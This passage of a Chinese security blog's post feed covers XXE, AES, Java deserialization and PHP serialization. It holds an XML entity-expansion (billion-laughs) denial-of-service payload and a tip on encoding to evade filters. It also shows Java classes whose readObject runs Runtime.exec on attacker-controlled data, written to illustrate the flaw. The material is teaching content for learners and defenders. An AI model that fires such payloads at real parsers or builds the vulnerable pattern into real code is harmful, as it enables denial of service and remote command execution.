class="keyword">a2</span> <span class="string">&quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;a2;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li>如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种 DDoS 攻击。</li></ul><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><ul><li>若 <code>ENTITY</code>、<code>SYSTEM</code>、<code>file</code>等关键词被过滤</li><li>使用编码方式绕过</li></ul><hr><p>参考自：<a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">CTF XXE</a>、<a href="https://blog.csdn.net/weixin_44420143/article/details/118721145">XXE知识总结，有这篇就够了！</a>、<a href="https://www.freebuf.com/column/181064.html">XXE&amp;XML外部实体注入攻击</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> XXE </tag>
            
            <tag> XML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AES加密算法流程</title>
      <link href="/2023/10/22/AES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%B5%81%E7%A8%8B/"/>
      <url>/2023/10/22/AES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="AES加密简介"><a href="#AES加密简介" class="headerlink" title="AES加密简介"></a>AES加密简介</h1><ul><li>现代密码学按照密钥的数量分为对称加密和非对称加密，对称加密只使用一个密钥加解密，而非对称需要公钥和私钥分别加解密。</li><li>AES属于对称加密，因为使用同一把密钥，所有速度快，适合数据量比较大的加解密。</li><li>AES是一种分组密码 分组长度为128位（16字节），根据密钥长度可分为AES-128 AES-192和AES-256，密钥长度不同，AES的加密轮数也不同。</li></ul><table><thead><tr><th align="center">AES</th><th align="center">密钥长度&#x2F;bit</th><th align="center">分组长度&#x2F;bit</th><th align="center">加密轮数</th></tr></thead><tbody><tr><td align="center">AES-128</td><td align="center">128</td><td align="center">128</td><td align="center">10</td></tr><tr><td align="center">AES-192</td><td align="center">192</td><td align="center">128</td><td align="center">12</td></tr><tr><td align="center">AES-256</td><td align="center">256</td><td align="center">128</td><td align="center">14</td></tr></tbody></table><h1 id="AES流程"><a href="#AES流程" class="headerlink" title="AES流程"></a>AES流程</h1><ul><li>AES的具体步骤主要分为<strong>密钥扩展</strong>、<strong>字节代换</strong>、<strong>行移位</strong>、列混淆、<strong>轮密钥加</strong>。</li><li>给定一个明文16位，是个4*4的字节矩阵，将轮密钥与明文进行异或运算</li><li>对密文块进行S-盒替换</li><li>再对结果进行行移位</li><li>再对结果进行列混淆交换</li><li>再进行轮密钥加</li><li>以128位为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022200846.png" alt="image.png"></li></ul><h2 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h2><ul><li>密钥扩展是将128位的密钥扩展为11个128位的密钥</li><li>每一轮用一个128位进行轮密钥加操作<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022201129.png" alt="image.png"></li><li>当i为4的倍数时，计算W[i]，W[i-1]进行左移1个字节（<strong>向上移动一位</strong>），然后用给定的S-盒进行替换，最后与W[i-4]和<strong>轮常数</strong>进行异或，得到W[i]</li><li>当i不是4的倍数时，W[i]就是W[i-1]和W[i-4]进行异或</li><li>重复40次，得到其余10轮的轮密钥</li><li><strong>轮常数:</strong></li></ul><table><thead><tr><th align="center">i</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9</th><th align="center">10</th><th align="center">11</th></tr></thead><tbody><tr><td align="center">RC[i]</td><td align="center">0x01</td><td align="center">0x02</td><td align="center">0x04</td><td align="center">0x08</td><td align="center">0x10</td><td align="center">0x20</td><td align="center">0x40</td><td align="center">0x80</td><td align="center">0x1B</td><td align="center">0x36</td><td align="center">0x6c</td></tr></tbody></table><h2 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h2><ul><li>被替换字节的高4位为X坐标，低4位为Y坐标</li><li>在S-盒当中找到替换的字节进行替换<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022202351.png" alt="image.png"></li></ul><h2 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h2><ul><li>第一行不变，第二行左移一个字节，第三行左移两个字节，第四行左移三个字节<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022202529.png" alt="image.png"></li></ul><h2 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h2><ul><li>对每一列进行单独的操作</li><li>把每一列都看成GF($2^8$)中的一个四项多项式$s(x)$，再与GF($2^8$)上的固定多项式$a(x)&#x3D;{03}x^3+{01}x^2+{01}x+{02}$进行模$x^4+1$的乘法运算。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022202709.png" alt="image.png"></li><li>拿我上课老师的PPT做个例子<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022203841.png" alt="image.png"></li></ul><h2 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h2><ul><li>轮密钥加就是将列混合得到的结果中的每一列分别与密钥中的每一列做异或，然后取代原字节序列，实现也很简单，就是一个异或操作。<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022203931.png" alt="image.png"></li></ul><h2 id="AES解密过程"><a href="#AES解密过程" class="headerlink" title="AES解密过程"></a>AES解密过程</h2><ul><li>看图就能理解了</li><li>AddRoundKey-&gt;轮密钥加</li><li>InvByteSub-&gt;字节替换</li><li>InvShiftRows-&gt;行移位</li><li>InvMixColumns-&gt;列混淆<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231022204129.png" alt="image.png"></li></ul><hr><ul><li>内容参考<a href="https://zhuanlan.zhihu.com/p/480298447#:~:text=%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B0%B1%E6%98%AF%E6%8A%8A%E4%B9%8B%E5%89%8D%E7%9A%84%E5%87%A0%E4%B8%AA%E6%93%8D%E4%BD%9C%E6%95%B4%E5%90%88%E8%B5%B7%E6%9D%A5%EF%BC%8C%E8%BF%99%E9%87%8C%E8%BF%98%E6%98%AF%E6%8B%BF%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84,AES-128%E4%BD%8D%E3%80%81ECB%E6%A8%A1%E5%BC%8F%20%E4%B8%BE%E4%BE%8B%EF%BC%8C128%E4%BD%8D%E5%AF%B9%E5%BA%94%E7%9A%84%E5%8A%A0%E5%AF%86%E8%BD%AE%E6%95%B0%E6%98%AF10%E8%BD%AE%EF%BC%8C%E5%85%B6%E4%B8%AD%E8%BD%AE%E5%AF%86%E9%92%A5%E5%8A%A0%E7%B4%AF%E8%AE%A111%E6%AC%A1%EF%BC%8C%E9%80%9A%E8%BF%87%E4%B9%8B%E5%89%8D%E7%9A%84%E4%BB%8B%E7%BB%8D%E6%88%91%E4%BB%AC%E7%9F%A5%E9%81%93%E5%8F%AA%E6%9C%89%E8%BD%AE%E5%AF%86%E9%92%A5%E4%B8%AD%E4%BC%9A%E7%94%A8%E5%88%B0%E5%AF%86%E9%92%A5%EF%BC%8C%E5%88%9D%E5%A7%8B%E5%AF%86%E9%92%A5%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%BA128%E4%BD%8D16%E5%AD%97%E8%8A%82%E7%BB%8F%E8%BF%8710%E6%AC%A1%E6%89%A9%E5%B1%95%E4%B9%8B%E5%90%8E%E6%AD%A3%E5%A5%BD%E6%BB%A1%E8%B6%B311%E6%AC%A1%E8%BD%AE%E5%AF%86%E9%92%A5%E5%8A%A0%E7%9A%84%E9%9C%80%E8%A6%81%E3%80%82">AES加解密流程及实现</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 加密算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化</title>
      <link href="/2023/10/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/10/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><ul><li>Java反序列化是近些年安全业界研究的重点领域之一，在Apache Commons Collections 、JBoss 、WebLogic 等常见容器、库中均发现有该类漏洞，而且该类型漏洞容易利用，造成的破坏很大，因此影响广泛。</li><li>Java 序列化是指把 Java 对象转换为字节序列的过程，序列化后的字节数据可以保存在文件、数据库中；而Java 反序列化是指把字节序列恢复为 Java 对象的过程。</li><li>序列化和反序列化通过<code>ObjectInputStream.readObject()</code>和<code>ObjectOutputStream.writeObject()</code>方法实现。</li><li>在java中任何类如果想要序列化必须实现java.io.Serializable接口<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>java.io.Serializable其实是一个空接口，在java中该接口的唯一作用是对一个类做一个 <strong>标记</strong> 让jre确定这个类是可以序列化的。</li><li>同时java中支持在类中定义如下函数：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream out)</span></span><br><span class="line">       <span class="keyword">throws</span> IOException</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br><span class="line">       <span class="keyword">throws</span> IOException, ClassNotFoundException;</span><br></pre></td></tr></table></figure></li><li>这两个函数不是java.io.Serializable的接口函数，而是约定的函数，如果一个类实现了这两个函数，那么在序列化和反序列化的时候ObjectInputStream.readObject()和ObjectOutputStream.writeObject()会主动调用这两个函数。这也是反序列化产生的根本原因</li><li>例如：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>该类在反序列化的时候会执行命令，我们构造一个序列化的对象，name为恶意命令，那么在反序列化的时候就会执行恶意命令。</li><li>在反序列化的过程中，攻击者仅能够控制“数据”，无法控制如何执行，因此必须借助被攻击应用中的具体场景来实现攻击目的</li><li>例如上例中存在一个执行命令的可以序列化的类（Hello），利用该类的readObject函数中的命令执行场景来实现攻击</li></ul><h1 id="Java反序列化分析"><a href="#Java反序列化分析" class="headerlink" title="Java反序列化分析"></a>Java反序列化分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyObject</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IOException &#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行打开计算器程序命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testSerialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//定义myObj对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line">        myObj.name = <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="comment">//创建一个包含对象进行反序列化信息的”object”数据文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将myObj对象写入object文件</span></span><br><span class="line">        os.writeObject(myObj);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (MyObject)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先我们定义了一个Myobject类并继承了Serializable接口，并且重写了readObject方法。我们知道在反序列化时会执行readObject方法。而我们在readObject()方法中写入了Runtime.getRuntime().exec(“calc.exe”)，在反序列化时就会执行相应的命令。</li></ul><h1 id="Java反序列化漏洞检测"><a href="#Java反序列化漏洞检测" class="headerlink" title="Java反序列化漏洞检测"></a>Java反序列化漏洞检测</h1><ul><li>反序列化漏洞需要依赖<strong>执行链</strong>来完成攻击payload执行。由于反序列化漏洞的特性，在检测的时候<strong>漏洞扫描工具</strong>一般聚焦<strong>已知漏洞</strong>的检测，而未知漏洞的检测，安全工具能力非常有限，一般需要专业人员通过<strong>安全审计</strong>、<strong>代码审计</strong>等方式发现。</li><li>java反序列化漏洞依赖于两个因素：</li></ul><ol><li>应用是否有反序列化接口</li><li>应用中是否包含有漏洞的组件</li></ol><ul><li>因此对应的漏洞扫描工具也需要根据这两个因素进行检测。</li></ul><h2 id="白盒工具测试"><a href="#白盒工具测试" class="headerlink" title="白盒工具测试"></a>白盒工具测试</h2><ul><li>白盒代码审计工具，可通过在调用链中查找是否有发序列化的操作：</li><li>调用链的入口不同框架是不同的。</li><li>调用链中一旦发现有发序列化操作<code>ObjectInputStream.readObject()</code>则该接口存在序列化操作</li><li>但仅仅依靠以上信息不足以判断是否存在漏洞，还需要判断代码中是否有存在<strong>执行链</strong>的三方依赖。在java中，一般通过分析<code>pox.xml build.gradle</code>文件来分析是否包含有漏洞的组件。</li></ul><h2 id="黑盒漏洞扫描器检测"><a href="#黑盒漏洞扫描器检测" class="headerlink" title="黑盒漏洞扫描器检测"></a>黑盒漏洞扫描器检测</h2><ul><li>web漏洞扫描器检测原理和白盒工具不一样。</li><li>首先漏洞扫描器要解决的是识别出反序列化的请求，在这里需要注意的是web漏洞扫描是无法通过爬虫方式直接发现反序列化接口的，因此往往需要配合其他web漏洞扫描器的组件（例如代理组件）来识别反序列化接口</li><li>如今web漏洞扫描器都提供了代理组件来发现应用的http请求，爬虫组件可通过前台页面触发请求进入代理组件；但在API场景下，还是需要测试人员进行API调用该操作才能够产生http请求数据。</li><li>在截获到http请求数据后，代理组件可以通过两种方式判断一个请求是否是序列化请求：</li></ul><ol><li>通过http请求的Content-Type，具体来说ContentType: application&#x2F;x-java-serialized-object 是序列化请求的请求头</li><li>检查请求数据的开头是否是 0xaced，有时候序列化请求不存在正确的content-type，此时需要根据数据来判断是否是序列化请求</li></ol><ul><li>在确定一个接口是序列化接口的时候会漏洞扫描器会发送探测payload判断接口是否有反序列化漏洞，这里的攻击payload类似于<a href="https://github.com/frohoff/ysoserial" title="ysoserial">ysoserial</a> 工具，由于绝大多数情况下不可能看到回显（http返回数据没有攻击执行结果），因此只能进行<strong>盲注</strong>，即发送 sleep 10 这样的命令，根据响应时间判断是否有漏洞。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> java反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2023/10/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/10/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20231021213111.png" alt="image.png"></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>序列化就是将数据转换成一种可逆的数据结构，逆向的过程就叫做<strong>反序列化</strong></li><li>比如：快递一张桌子，一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当收到货后，就需要把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。<blockquote><p>PHP将数据序列化和反序列化会用到两个函数</p><ol><li><strong>serialize</strong> 将对象格式化成有序的字符串</li><li><strong>unserialize</strong> 将字符串还原成原来的对象</li></ol></blockquote></li><li>序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。</li></ul><h1 id="常见的序列化格式"><a href="#常见的序列化格式" class="headerlink" title="常见的序列化格式"></a>常见的序列化格式</h1><ul><li>二进制格式</li><li>字节数组</li><li>json字符串</li><li>xml字符串</li></ul><h1 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h1><h2 id="序列化函数serialize"><a href="#序列化函数serialize" class="headerlink" title="序列化函数serialize()"></a>序列化函数serialize()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;adedyui&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>&#x2F;&#x2F;输出结果：</li><li><code>O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</code><blockquote><p>O代表对象，因为我们序列化的是一个对象；序列化数组的话则用A来表示<br>3代表类的名字长三个字符<br>Ctf 是类名<br>3代表这个类里有三个属性(三个变量)<br>s代表字符串<br>4代表属性名的长度<br>flag是属性名<br>s:13:”flag{adedyui}” 字符串，属性长度，属性值</p></blockquote></li><li><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。</li><li>如果存在，<code>__sleep()</code>方法会先被调用，然后才执行序列化操作。</li><li>可以在<code>__sleep()</code>方法里决定哪些属性可以被序列化。如果没有<code>__sleep()</code>方法则默认序列化所有属性<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;age&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;abedyui&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>&#x2F;&#x2F; 输出结果：</li><li><code>O:3:&quot;Ctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</code></li><li>这里<code>__sleep()</code>方法决定了哪些属性被序列化</li></ul><h2 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h2><ul><li>根据访问控制修饰符的不同序列化后的<strong>属性长度</strong>和<strong>属性值</strong>会有所不同<blockquote><p>public(公有)<br>protected(受保护)     &#x2F;&#x2F; %00*%00属性名<br>private(私有的)       &#x2F;&#x2F; %00类名%00属性名</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span>=<span class="string">&#x27;19&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>=<span class="string">&#x27;get flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li>&#x2F;&#x2F;输出结果</li><li><code>O:3:&quot;Ctf&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:6:&quot;*age&quot;;s:2:&quot;19&quot;;s:9:&quot;Ctfflag&quot;;s:8:&quot;get flag&quot;;&#125;</code></li><li>age的长度为6，前面有两个%00空白符，Ctfflag同理</li></ul><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="反序列化函数unserialize"><a href="#反序列化函数unserialize" class="headerlink" title="反序列化函数unserialize()"></a>反序列化函数unserialize()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;flag&#123;****&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cxk&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;10&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfer</span>=<span class="keyword">new</span> <span class="title class_">Ctf</span>();     <span class="comment">//实例化一个对象</span></span><br><span class="line"><span class="variable">$ctfer</span>-&gt;flag=<span class="string">&#x27;flag&#123;adedyui&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;name=<span class="string">&#x27;Sch0lar&#x27;</span>;</span><br><span class="line"><span class="variable">$ctfer</span>-&gt;age=<span class="string">&#x27;18&#x27;</span></span><br><span class="line">    <span class="variable">$str</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$ctfer</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>unserialize()会检查类中是否存在一个<code>__wakeup</code>魔术方法</li><li>如果存在则会先调用<code>__wakeup()</code>方法，再进行序列化</li><li>可以在<code>__wakeup()</code>方法中对属性进行初始化、赋值或者改变。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 